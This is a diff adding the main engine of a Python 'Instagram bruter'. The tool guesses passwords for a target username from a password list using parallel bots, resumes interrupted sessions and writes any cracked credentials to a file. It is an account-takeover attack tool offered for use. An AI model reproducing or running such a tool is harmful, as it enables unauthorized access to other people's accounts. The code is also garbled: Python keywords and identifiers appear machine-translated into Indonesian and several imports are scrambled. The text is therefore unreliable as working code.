@@ -1,0 +1,132 @@
+# Tanggal: 12/29/2018
+# Penulis: Mohamed
+# Description: Instagram bruter
+
+dari sys import keluar
+dari os.path impor ada
+dari lib.bruter import Bruter
+dari lib.display import Display
+dari platform import python_version
+dari kredensial impor lib.const, mode
+dari import argparse ArgumentParser, ArgumentTypeError
+
+
+class Engine (objek):
+
+    def __init __ (self, username, threads, passlist_path, is_color):
+        self.bruter = Tidak ada
+        self.resume = Salah
+        self.is_alive = Benar
+        self.threads = utas
+        self.username = nama pengguna
+        self.passlist_path = passlist_path
+        self.display = Tampilan (is_color = is_color)
+
+    def passlist_path_exists (self):
+        jika tidak ada (self.passlist_path):
+            self.display.warning ('Jalur tidak valid ke daftar kata sandi')
+            return False
+        kembali Benar
+
+    def create_bruter (self):
+        self.bruter = Bruter (
+            self.username,
+            self.threads,
+            self.passlist_path
+        )
+
+    def get_user_resp (sendiri):
+        return self.display.prompt ('Apakah Anda ingin melanjutkan serangan? [y / n]:')
+
+    def write_to_file (self, password):
+        dengan open (credentials, 'at') as f:
+            data = 'Nama pengguna: {} \ nKata sandi: {} \ n \ n'.format (
+                self.username.title (), password)
+            f. menulis (data)
+
+    def mulai (sendiri):
+        jika tidak self.passlist_path_exists ():
+            self.is_alive = Salah
+
+        jika self.is_alive:
+            self.create_bruter ()
+
+            sementara self.is_alive dan bukan self.bruter.password_manager.session:
+                lulus
+
+            jika tidak self.is_alive:
+                kembali
+
+            jika self.bruter.password_manager.session.exists:
+                mencoba:
+                    resp = self.get_user_resp ()
+                kecuali:
+                    self.is_alive = Salah
+
+                jika resp dan self.is_alive:
+                    jika resp.strip (). lower () == 'y':
+                        self.bruter.password_manager.resume = Benar
+
+            mencoba:
+                self.bruter.start ()
+            kecuali KeyboardInterrupt:
+                self.bruter.stop ()
+                self.bruter.display.shutdown (self.bruter.last_password,
+                                             self.bruter.password_manager.attempts, len (self.bruter.browsers))
+            akhirnya:
+                self.stop ()
+
+    def stop (self):
+        jika self.is_alive:
+
+            self.bruter.stop ()
+            self.is_alive = Salah
+
+            jika self.bruter.password_manager.is_read dan bukan self.bruter.is_found dan bukan self.bruter.password_manager.list_size:
+                self.bruter.display.stats_not_found (self.bruter.last_password,
+                                                    self.bruter.password_manager.attempts, len (self.bruter.browsers))
+
+            jika self.bruter.is_found:
+                self.write_to_file (self.bruter.password)
+                self.bruter.display.stats_found (self.bruter.password,
+                                                self.bruter.password_manager.attempts, len (self.bruter.browsers))
+
+
+def valid_int (n):
+    jika tidak n.isdigit ():
+        menaikkan ArgumentTypeError ('mode harus berupa angka')
+
+    n = int (n)
+
+    jika n> 3:
+        menaikkan ArgumentTypeError ('maksimum untuk mode adalah 3')
+
+    jika n <0:
+        naikkan ArgumentTypeError ('minimum untuk mode adalah 0')
+
+    kembali n
+
+
+def args ():
+    args = ArgumentParser ()
+    args.add_argument ('username', help = 'email or username')
+    args.add_argument ('passlist', help = 'password list')
+    args.add_argument ('- nc', '--no-color', dest = 'color',
+                      action = 'store_true', help = 'nonaktifkan warna')
+    args.add_argument ('- m', '--mode', default = 2, type = valid_int,
+                      bantuan = 'mode: 0 => 32 bot; 1 => 16 bot; 2 => 8 bot; 3 => 4 bot ')
+    return args.parse_args ()
+
+
+jika __name__ == '__main__':
+
+    jika int (python_version () [0]) <3:
+        print ('[!] Harap gunakan Python 3')
+        keluar()
+
+    arugments = args ()
+    mode = arugments.mode
+    username = arugments.username
+    passlist = arugments.passlist
+    is_color = True jika bukan arugments.color else False
+    Mesin (nama pengguna, mode [mode], daftar sandi, is_color) .start ()
